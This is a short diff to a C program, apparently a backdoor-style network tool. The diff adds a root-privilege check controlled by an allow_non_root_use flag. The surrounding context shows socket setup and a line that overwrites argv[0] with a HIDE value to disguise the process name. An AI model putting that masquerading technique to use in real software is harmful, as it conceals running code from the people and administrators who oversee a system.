@@ -42,6 +42,22 @@ bzero(&(home.sin_zero),8);
 ////////////////////////////////////////////////////////////////////
 
 
+int allow_non_root_use = 1;
+
+if (allow_non_root_use == 1)	
+{
+	printf("WARNING:\nrunning this as a non-privlidged user\ncauses it to function in unexpected ways, you have been warned\n");
+}
+if (allow_non_root_use == 0)
+{
+	if(getuid() != 0)
+	{
+		printf("not root exiting!!!\n");
+		exit(-1337);
+	}
+}
+
+
 //changing the name in a not so sneaky way... 
 strcpy(argv[0],HIDE);
 
